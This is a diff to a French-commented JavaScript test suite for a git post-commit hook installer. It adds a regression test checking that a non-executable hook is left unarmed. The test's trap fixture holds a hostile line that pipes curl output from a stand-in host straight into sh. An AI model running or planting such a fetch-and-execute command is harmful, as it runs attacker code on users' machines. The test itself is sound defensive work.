@@ -63,7 +63,8 @@ test("remplacer le bloc ovrsee d'un post-commit existant le laisse le reste inta
     END,
     'echo "autre chose"',
   ].join('\n')
-  writeFileSync(hookPath, existing, 'utf8')
+  // Exécutable, comme l'a laissé l'installation précédente.
+  writeFileSync(hookPath, existing, { encoding: 'utf8', mode: 0o755 })
 
   installPostCommit(root, done)
 
@@ -90,7 +91,7 @@ test('graphify avant ovrsee : les deux blocs coexistent, seul ovrsee est remplac
     END,
     'echo "fin"',
   ].join('\n')
-  writeFileSync(hookPath, existing, 'utf8')
+  writeFileSync(hookPath, existing, { encoding: 'utf8', mode: 0o755 })
 
   installPostCommit(root, done)
 
@@ -120,7 +121,7 @@ test('graphify après ovrsee : les deux blocs coexistent, seul ovrsee est rempla
     'echo "graphify"',
     GRAPHIFY_END,
   ].join('\n')
-  writeFileSync(hookPath, existing, 'utf8')
+  writeFileSync(hookPath, existing, { encoding: 'utf8', mode: 0o755 })
 
   installPostCommit(root, done)
 
@@ -143,7 +144,7 @@ test("un post-commit avec marqueur d'ouverture mais pas de fermeture échoue", (
     START,
     'echo "oups, pas de fin"',
   ].join('\n')
-  writeFileSync(hookPath, existing, 'utf8')
+  writeFileSync(hookPath, existing, { encoding: 'utf8', mode: 0o755 })
   const contentBefore = readFileSync(hookPath, 'utf8')
 
   assert.throws(() => installPostCommit(root, done), /ovrsee-hook-end|non refermé/)
@@ -164,7 +165,7 @@ test("un marqueur de fermeture sans ouverture n'est pas un problème", () => {
     'echo "quelque chose"',
     END,
   ].join('\n')
-  writeFileSync(hookPath, existing, 'utf8')
+  writeFileSync(hookPath, existing, { encoding: 'utf8', mode: 0o755 })
 
   // Ne doit pas lancer d'erreur
   installPostCommit(root, done)
@@ -316,4 +317,20 @@ test('installClaudeHooks laisse intact un settings.json illisible', () => {
 
   assert.equal(readFileSync(path, 'utf8'), '{ pas du json')
   assert.ok(done.some(l => /illisible/.test(l)))
+})
+
+test('un post-commit présent mais inerte n’est ni modifié ni rendu exécutable', { skip: process.platform === 'win32' }, () => {
+  // Un dépôt reçu en archive peut livrer un hook non exécutable, que git ignore.
+  // Y ajouter le bloc ovrsee puis le `chmod 755` armait son contenu.
+  const root = tempRepo()
+  const hookPath = join(root, '.git', 'hooks', 'post-commit')
+  const piege = '#!/bin/sh\ncurl -s https://exemple.invalid/x | sh\n'
+  writeFileSync(hookPath, piege, { encoding: 'utf8', mode: 0o644 })
+  const done = []
+
+  installPostCommit(root, done)
+
+  assert.equal(readFileSync(hookPath, 'utf8'), piege)
+  assert.equal(statSync(hookPath).mode & 0o111, 0, 'le hook ne doit pas devenir exécutable')
+  assert.ok(done.some(l => /pas exécutable/.test(l)), 'le refus est dit')
 })
